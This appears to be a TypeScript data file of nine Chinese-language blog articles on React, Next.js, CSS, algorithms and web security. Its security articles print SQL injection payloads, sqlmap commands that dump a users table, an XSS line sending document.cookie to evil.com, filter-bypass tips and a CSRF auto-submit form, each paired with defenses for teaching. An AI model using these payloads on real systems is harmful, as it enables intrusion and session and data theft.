import type { Article } from '@/types'

export const articles: Article[] = [
  {
    id: '1',
    title: 'React 18 并发特性深度解析：从 Suspense 到 Transitions',
    summary: '深入探讨 React 18 引入的并发渲染机制，包括 Suspense、startTransition、useDeferredValue 等核心 API 的实现原理与最佳实践。',
    content: `React 18 引入了全新的并发特性，彻底改变了 React 应用的渲染方式。本文将深入探讨这些特性的底层原理和使用场景。

## 并发渲染的核心概念

并发渲染是 React 18 最核心的特性。与传统的同步渲染不同，并发渲染允许 React 在渲染过程中"暂停"和"恢复"，从而实现更流畅的用户体验。

### 什么是并发？

在 React 中，并发意味着多个任务可以交错执行，而不是必须按顺序完成。React 可以在渲染一棵大型组件树的过程中暂停，去处理更高优先级的更新，然后再回来继续之前的渲染。

\`\`\`typescript
import { startTransition } from 'react'

function SearchPage() {
  const [query, setQuery] = useState('')
  const [results, setResults] = useState([])

  function handleChange(e: React.ChangeEvent<HTMLInputElement>) {
    const value = e.target.value
    setQuery(value)
    
    startTransition(() => {
      const filtered = searchData(value)
      setResults(filtered)
    })
  }

  return (
    <div>
      <input value={query} onChange={handleChange} />
      <ResultList results={results} />
    </div>
  )
}
\`\`\`

## Suspense 与数据获取

Suspense 不再仅仅是代码分割的工具，现在它可以用于任何异步操作：

\`\`\`typescript
function ProfilePage() {
  return (
    <Suspense fallback={<ProfileSkeleton />}>
      <ProfileDetails />
      <Suspense fallback={<PostsSkeleton />}>
        <ProfilePosts />
      </Suspense>
    </Suspense>
  )
}
\`\`\`

## useDeferredValue 的使用场景

useDeferredValue 让你可以延迟更新 UI 的某个部分，让其他部分先更新：

\`\`\`typescript
function App() {
  const [text, setText] = useState('')
  const deferredText = useDeferredValue(text)
  
  return (
    <>
      <input value={text} onChange={e => setText(e.target.value)} />
      <SlowList text={deferredText} />
    </>
  )
}
\`\`\`

## 总结

React 18 的并发特性为构建高性能用户界面提供了强大的工具。关键是理解何时使用哪种 API，以及在什么场景下它们能带来最大的价值。`,
    category: 'web',
    tags: ['React', 'JavaScript', '前端架构', '并发编程'],
    date: '2026-05-10',
    readTime: 8,
    featured: true,
  },
  {
    id: '2',
    title: 'SQL 注入攻击原理与防御：从入门到实战',
    summary: '系统讲解 SQL 注入的攻击原理、常见变种、自动化工具使用以及多层防御策略，帮助你全面理解这一经典但依然高危的 Web 安全漏洞。',
    content: `SQL 注入（SQL Injection）是 Web 安全领域最经典的攻击方式之一，但至今仍在 OWASP Top 10 中名列前茅。

## 攻击原理

当应用程序将用户输入直接拼接到 SQL 查询语句中时，攻击者可以通过构造特殊的输入来改变 SQL 语句的语义。

\`\`\`sql
-- 正常的查询
SELECT * FROM users WHERE username = '$input'

-- 攻击输入: admin' OR '1'='1
-- 实际执行的 SQL:
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
\`\`\`

## 注入类型

### 1. 联合查询注入

\`\`\`sql
' UNION SELECT username, password FROM users --
\`\`\`

### 2. 盲注 - 布尔型

\`\`\`sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --
\`\`\`

### 3. 盲注 - 时间型

\`\`\`sql
' AND IF((SELECT password FROM users WHERE username='admin') LIKE 'a%', SLEEP(5), 0) --
\`\`\`

## 自动化工具

SQLMap 是渗透测试中最常用的 SQL 注入自动化工具：

\`\`\`bash
# 基础扫描
sqlmap -u "http://target.com/page.php?id=1"

# 获取数据库列表
sqlmap -u "http://target.com/page.php?id=1" --dbs

# 获取表名
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# 导出数据
sqlmap -u "http://target.com/page.php?id=1" -D db -T users --dump
\`\`\`

## 防御策略

1. **参数化查询**：使用 Prepared Statements 是首要防御手段
2. **输入验证**：白名单验证 + 类型检查
3. **最小权限原则**：数据库用户只赋予必要权限
4. **WAF**：Web 应用防火墙作为补充防护
5. **错误信息处理**：不要向用户暴露数据库错误详情`,
    category: 'pentest',
    tags: ['SQL注入', 'Web安全', '渗透测试', 'OWASP'],
    date: '2026-05-08',
    readTime: 10,
    featured: true,
  },
  {
    id: '3',
    title: '动态规划入门到进阶：从斐波那契到背包问题',
    summary: '通过经典案例逐步讲解动态规划的核心思想——最优子结构和重叠子问题，涵盖记忆化搜索、状态转移方程推导和空间优化技巧。',
    content: `动态规划（Dynamic Programming）是算法领域最核心也最具挑战性的主题之一。本文将从基础概念出发，逐步进阶。

## 核心思想

动态规划的核心是两个关键特性：
- **最优子结构**：问题的最优解包含子问题的最优解
- **重叠子问题**：子问题被重复计算多次

## 经典案例：斐波那契数列

### 递归解法（指数时间）

\`\`\`javascript
function fib(n) {
  if (n <= 1) return n
  return fib(n - 1) + fib(n - 2)
}
// 时间复杂度: O(2^n)
\`\`\`

### 记忆化搜索（自顶向下）

\`\`\`javascript
function fib(n, memo = {}) {
  if (n <= 1) return n
  if (memo[n] !== undefined) return memo[n]
  memo[n] = fib(n - 1, memo) + fib(n - 2, memo)
  return memo[n]
}
// 时间复杂度: O(n)
\`\`\`

### 动态规划（自底向上）

\`\`\`javascript
function fib(n) {
  if (n <= 1) return n
  const dp = [0, 1]
  for (let i = 2; i <= n; i++) {
    dp[i] = dp[i - 1] + dp[i - 2]
  }
  return dp[n]
}
\`\`\`

## 0-1 背包问题

给定 n 个物品，每个物品有重量 w[i] 和价值 v[i]，背包容量为 W，求最大价值。

### 状态定义

dp[i][j]：前 i 个物品，容量为 j 时的最大价值

### 状态转移方程

\`\`\`
dp[i][j] = max(dp[i-1][j], dp[i-1][j-w[i]] + v[i])
\`\`\`

### 空间优化

\`\`\`javascript
function knapsack(weights, values, W) {
  const n = weights.length
  const dp = new Array(W + 1).fill(0)
  
  for (let i = 0; i < n; i++) {
    for (let j = W; j >= weights[i]; j--) {
      dp[j] = Math.max(dp[j], dp[j - weights[i]] + values[i])
    }
  }
  
  return dp[W]
}
\`\`\`

## 解题方法论

1. 确定状态和选择
2. 明确 dp 数组的含义
3. 找出状态转移方程
4. 确定 base case
5. 考虑空间优化`,
    category: 'algorithm',
    tags: ['动态规划', '算法', '背包问题', '状态转移'],
    date: '2026-05-05',
    readTime: 12,
    featured: true,
  },
  {
    id: '4',
    title: 'Next.js 14 App Router 实战：服务端组件与流式渲染',
    summary: '探索 Next.js 14 App Router 架构下的 Server Components、Streaming SSR 和 Partial Prerendering 等前沿特性。',
    content: `Next.js 14 的 App Router 代表了 React 全栈框架的未来方向。

## Server Components

默认情况下，App Router 中的所有组件都是 Server Components：

\`\`\`tsx
// app/posts/page.tsx (Server Component)
import { prisma } from '@/lib/prisma'

export default async function PostsPage() {
  const posts = await prisma.post.findMany({
    orderBy: { createdAt: 'desc' },
  })

  return (
    <div>
      {posts.map(post => (
        <PostCard key={post.id} post={post} />
      ))}
    </div>
  )
}
\`\`\`

## 流式渲染

使用 loading.tsx 和 Suspense 实现流式渲染：

\`\`\`tsx
// app/dashboard/page.tsx
import { Suspense } from 'react'
import { StatsCards, RecentActivity } from './components'

export default function DashboardPage() {
  return (
    <div>
      <Suspense fallback={<StatsSkeleton />}>
        <StatsCards />
      </Suspense>
      <Suspense fallback={<ActivitySkeleton />}>
        <RecentActivity />
      </Suspense>
    </div>
  )
}
\`\`\``,
    category: 'web',
    tags: ['Next.js', 'React', 'SSR', '全栈'],
    date: '2026-04-28',
    readTime: 7,
    featured: false,
  },
  {
    id: '5',
    title: 'XSS 跨站脚本攻击深度剖析：反射型、存储型与 DOM 型',
    summary: '全面解析三种 XSS 攻击类型的原理、利用方式和防御策略，结合实战案例演示绕过技巧与安全编码实践。',
    content: `跨站脚本攻击（XSS）是 Web 安全中最普遍也最危险的漏洞之一。

## 三种 XSS 类型

### 反射型 XSS

攻击代码在 HTTP 请求参数中，服务器将其"反射"回响应页面：

\`\`\`html
<!-- URL: /search?q=<script>alert(1)</script> -->
<input value="<script>alert(1)</script>">
\`\`\`

### 存储型 XSS

攻击代码被永久存储在服务器端（数据库、文件系统等）：

\`\`\`javascript
// 用户评论
const comment = "<script>fetch('http://evil.com?cookie='+document.cookie)</script>"
db.comments.insert({ content: comment })
\`\`\`

### DOM 型 XSS

攻击代码通过客户端 JavaScript 动态修改 DOM 执行：

\`\`\`javascript
// 危险代码
const hash = location.hash.slice(1)
document.getElementById('content').innerHTML = hash
// URL: /page#<img src=x onerror=alert(1)>
\`\`\`

## 绕过技巧

1. 大小写混用: \`<ScRiPt>\`
2. 编码绕过: HTML Entity, URL Encoding, Unicode
3. 事件处理器: \`onerror\`, \`onload\`, \`onfocus\`

## 防御方案

- 输出编码：HTML Entity 编码、JavaScript 编码、URL 编码
- CSP（内容安全策略）：限制可执行脚本来源
- HttpOnly Cookie：防止 JavaScript 读取敏感 Cookie
- XSS Filter / WAF：作为辅助防护层`,
    category: 'pentest',
    tags: ['XSS', 'Web安全', '前端安全', 'CSP'],
    date: '2026-04-25',
    readTime: 9,
    featured: false,
  },
  {
    id: '6',
    title: 'LeetCode 热门题目精讲：滑动窗口与双指针技巧',
    summary: '总结滑动窗口和双指针的核心模板与变体，覆盖最长无重复子串、最小覆盖子串、接雨水等高频面试题，助你快速掌握解题套路。',
    content: `滑动窗口和双指针是 LeetCode 中最高频的算法技巧之一。

## 滑动窗口模板

### 最长/最短窗口模板

\`\`\`javascript
function slidingWindow(s) {
  let left = 0, right = 0
  const window = {}
  
  while (right < s.length) {
    const c = s[right]
    right++
    // 窗口扩大，更新数据
    
    while (/* 需要收缩 */) {
      const d = s[left]
      left++
      // 窗口缩小，更新数据
    }
  }
}
\`\`\`

### 例题：最长无重复子串

\`\`\`javascript
function lengthOfLongestSubstring(s) {
  const map = new Map()
  let left = 0, maxLen = 0
  
  for (let right = 0; right < s.length; right++) {
    if (map.has(s[right])) {
      left = Math.max(left, map.get(s[right]) + 1)
    }
    map.set(s[right], right)
    maxLen = Math.max(maxLen, right - left + 1)
  }
  
  return maxLen
}
\`\`\`

## 双指针技巧

### 快慢指针（环形链表检测）

\`\`\`javascript
function hasCycle(head) {
  let slow = head, fast = head
  while (fast && fast.next) {
    slow = slow.next
    fast = fast.next.next
    if (slow === fast) return true
  }
  return false
}
\`\`\`

### 左右指针（两数之和 II）

\`\`\`javascript
function twoSum(numbers, target) {
  let left = 0, right = numbers.length - 1
  while (left < right) {
    const sum = numbers[left] + numbers[right]
    if (sum === target) return [left + 1, right + 1]
    sum < target ? left++ : right--
  }
}
\`\`\``,
    category: 'algorithm',
    tags: ['LeetCode', '滑动窗口', '双指针', '面试'],
    date: '2026-04-20',
    readTime: 6,
    featured: false,
  },
  {
    id: '7',
    title: 'CSS Container Queries 实战：组件级响应式设计新纪元',
    summary: 'Container Queries 让组件可以根据父容器尺寸而非视口尺寸调整样式，彻底改变了响应式设计的范式。',
    content: `Container Queries 是 CSS 领域近年来最重要的新特性之一。

## 基础用法

\`\`\`css
.card-container {
  container-type: inline-size;
  container-name: card;
}

@container card (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 1fr 2fr;
  }
}

@container card (max-width: 399px) {
  .card {
    display: flex;
    flex-direction: column;
  }
}
\`\`\`

## 与 Media Queries 的对比

Media Queries 基于视口（viewport），而 Container Queries 基于父容器。这使得组件可以在不同上下文中独立响应。

\`\`\`css
/* Media Query - 全局视角 */
@media (min-width: 768px) {
  .sidebar { width: 300px }
}

/* Container Query - 组件视角 */
@container sidebar (min-width: 300px) {
  .sidebar-item { flex-direction: row }
}
\`\`\``,
    category: 'web',
    tags: ['CSS', '响应式设计', '前端', 'Container Queries'],
    date: '2026-04-15',
    readTime: 5,
    featured: false,
  },
  {
    id: '8',
    title: 'CSRF 攻击与防御：从原理到 SameSite Cookie',
    summary: '深入理解跨站请求伪造（CSRF）的攻击流程，掌握 Token 验证、Referer 检查、SameSite Cookie 等防御手段。',
    content: `CSRF（Cross-Site Request Forgery）是一种诱导用户在已登录的 Web 应用上执行非预期操作的攻击。

## 攻击原理

攻击者构造一个恶意页面，诱导已登录用户访问，该页面自动向目标网站发送请求（如转账、修改密码等），利用用户的登录态完成攻击。

\`\`\`html
<!-- 攻击页面 evil.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

## 防御策略

### CSRF Token

服务端生成随机 Token，嵌入表单和 Cookie，提交时验证一致性。

### SameSite Cookie

\`\`\`
Set-Cookie: session=xxx; SameSite=Strict
\`\`\`

### Referer/Origin 检查

验证请求来源是否为可信域名。`,
    category: 'pentest',
    tags: ['CSRF', 'Web安全', 'Cookie', 'OWASP'],
    date: '2026-04-10',
    readTime: 7,
    featured: false,
  },
  {
    id: '9',
    title: '图论算法实战：Dijkstra 最短路径与拓扑排序',
    summary: '掌握图论中的核心算法：Dijkstra 最短路径（含堆优化）和 Kahn 拓扑排序，附 LeetCode 真题演练。',
    content: `图论是算法面试中的重头戏。本文重点讲解两个核心算法。

## Dijkstra 最短路径

### 朴素实现

\`\`\`javascript
function dijkstra(graph, start) {
  const n = graph.length
  const dist = new Array(n).fill(Infinity)
  const visited = new Array(n).fill(false)
  dist[start] = 0
  
  for (let i = 0; i < n; i++) {
    let u = -1
    for (let j = 0; j < n; j++) {
      if (!visited[j] && (u === -1 || dist[j] < dist[u])) {
        u = j
      }
    }
    visited[u] = true
    for (let v = 0; v < n; v++) {
      if (graph[u][v] > 0) {
        dist[v] = Math.min(dist[v], dist[u] + graph[u][v])
      }
    }
  }
  return dist
}
\`\`\`

### 堆优化（优先队列）

使用优先队列可以将时间复杂度从 O(V²) 优化到 O(E log V)。

## 拓扑排序（Kahn 算法）

\`\`\`javascript
function topologicalSort(n, edges) {
  const indegree = new Array(n).fill(0)
  const adj = Array.from({ length: n }, () => [])
  
  for (const [u, v] of edges) {
    adj[u].push(v)
    indegree[v]++
  }
  
  const queue = []
  for (let i = 0; i < n; i++) {
    if (indegree[i] === 0) queue.push(i)
  }
  
  const result = []
  while (queue.length) {
    const u = queue.shift()
    result.push(u)
    for (const v of adj[u]) {
      if (--indegree[v] === 0) queue.push(v)
    }
  }
  
  return result.length === n ? result : []
}
\`\`\``,
    category: 'algorithm',
    tags: ['图论', 'Dijkstra', '拓扑排序', '数据结构'],
    date: '2026-04-05',
    readTime: 9,
    featured: false,
  },
]